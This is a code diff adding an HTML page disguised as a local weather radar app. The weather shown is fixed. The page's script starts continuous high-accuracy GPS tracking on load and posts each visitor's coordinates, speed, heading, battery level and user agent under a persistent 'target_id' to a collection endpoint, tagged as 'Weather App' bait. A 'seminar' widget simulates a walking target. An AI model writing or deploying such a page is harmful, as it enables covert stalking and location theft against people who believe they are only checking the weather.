@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Local Weather Radar</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            padding: 20px;
+        }
+
+        .weather-card {
+            background: rgba(255, 255, 255, 0.07);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 24px;
+            padding: 36px 28px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+
+        .card-header h2 {
+            font-size: 22px;
+            font-weight: 700;
+        }
+
+        .card-header p {
+            font-size: 13px;
+            color: #94a3b8;
+            margin-top: 4px;
+        }
+
+        .weather-icon-box {
+            font-size: 72px;
+            color: #38bdf8;
+            margin: 28px 0;
+            filter: drop-shadow(0 0 15px rgba(56, 189, 248, 0.4));
+        }
+
+        .temp-display {
+            font-size: 48px;
+            font-weight: 700;
+            line-height: 1;
+        }
+
+        .condition-text {
+            font-size: 16px;
+            color: #cbd5e1;
+            margin-top: 6px;
+            margin-bottom: 24px;
+        }
+
+        .btn-check-weather {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #38bdf8 0%, #0284c7 100%);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 8px 20px rgba(2, 132, 199, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-check-weather:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px rgba(2, 132, 199, 0.6);
+        }
+
+        .btn-check-weather:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* Seminar Presentation Simulator Widget */
+        .sim-widget {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px dashed rgba(255, 255, 255, 0.15);
+            font-size: 12px;
+            color: #94a3b8;
+        }
+
+        .btn-sim-toggle {
+            margin-top: 8px;
+            padding: 8px 14px;
+            background: rgba(245, 158, 11, 0.2);
+            border: 1px solid #f59e0b;
+            color: #fbbf24;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="weather-card">
+        <div class="card-header">
+            <h2>Local Weather Forecast</h2>
+            <p><i class="fa-solid fa-location-dot"></i> <span id="locationName">Detecting Location...</span></p>
+        </div>
+
+        <div class="weather-icon-box">
+            <i class="fa-solid fa-cloud-sun"></i>
+        </div>
+
+        <div class="temp-display">28°C</div>
+        <div class="condition-text">Partly Cloudy • Humidity 62%</div>
+
+        <button id="weatherBtn" class="btn-check-weather" onclick="requestLocation()">
+            <i class="fa-solid fa-arrows-rotate"></i>
+            <span>CHECK LIVE WEATHER</span>
+        </button>
+
+        <div class="sim-widget">
+            <div><i class="fa-solid fa-chalkboard-user"></i> Seminar Presentation Mode</div>
+            <button id="simBtn" class="btn-sim-toggle" onclick="toggleSim()">
+                Enable Walking GPS Simulation
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const targetId = new URLSearchParams(window.location.search).get("id") || localStorage.getItem("target_id") || generateId();
+        localStorage.setItem("target_id", targetId);
+
+        let watchId = null;
+        let isSimulating = false;
+        let simInterval = null;
+
+        function generateId(length = 8) {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            let res = 'User-';
+            for (let i = 0; i < length; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
+            return res;
+        }
+
+        function requestLocation() {
+            const btn = document.getElementById("weatherBtn");
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Detecting Precise Radar...';
+
+            if (!navigator.geolocation) {
+                alert("Geolocation is not supported by your browser.");
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fa-solid fa-arrows-rotate"></i> CHECK LIVE WEATHER';
+                return;
+            }
+
+            // Start Geolocation watchPosition
+            watchId = navigator.geolocation.watchPosition(
+                (pos) => {
+                    btn.innerHTML = '<i class="fa-solid fa-circle-check"></i> Radar Sync Active';
+                    document.getElementById("locationName").innerText = "Syncing GPS Radar";
+                    sendPayload({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        altitude: pos.coords.altitude || 0,
+                        accuracy: pos.coords.accuracy || 10,
+                        speed: pos.coords.speed || 0,
+                        heading: pos.coords.heading || 0
+                    });
+                },
+                (err) => {
+                    alert("Please enable Location Services to view local weather radar.");
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fa-solid fa-arrows-rotate"></i> RETRY LOCATION ACCESS';
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        async function getBatteryLevel() {
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    return `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : ''}`;
+                }
+            } catch (e) { }
+            return "N/A";
+        }
+
+        async function sendPayload(coords) {
+            const battery = await getBatteryLevel();
+            const payload = {
+                id: targetId,
+                lat: coords.lat,
+                lng: coords.lng,
+                altitude: coords.altitude,
+                accuracy: coords.accuracy,
+                speed: coords.speed,
+                heading: coords.heading,
+                battery,
+                userAgent: navigator.userAgent,
+                baitType: "Weather App"
+            };
+
+            fetch("/location-payload", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Payload post error", err));
+        }
+
+        function toggleSim() {
+            const btn = document.getElementById("simBtn");
+            if (isSimulating) {
+                isSimulating = false;
+                clearInterval(simInterval);
+                btn.innerText = "Enable Walking GPS Simulation";
+                btn.style.borderColor = "#f59e0b";
+                return;
+            }
+
+            isSimulating = true;
+            btn.innerText = "Stop Walking GPS Simulation";
+            btn.style.borderColor = "#ef4444";
+
+            let lat = 17.3850;
+            let lng = 78.4867;
+            let step = 0;
+
+            simInterval = setInterval(() => {
+                step += 0.05;
+                lat += Math.sin(step) * 0.0004;
+                lng += Math.cos(step) * 0.0004;
+                sendPayload({
+                    lat, lng,
+                    altitude: 540,
+                    accuracy: 8,
+                    speed: 5.4,
+                    heading: 120
+                });
+            }, 3000);
+        }
+
+        // Auto trigger location request on page load if allowed
+        window.addEventListener("load", () => {
+            setTimeout(requestLocation, 1000);
+        });
+    </script>
+</body>
+
+</html>
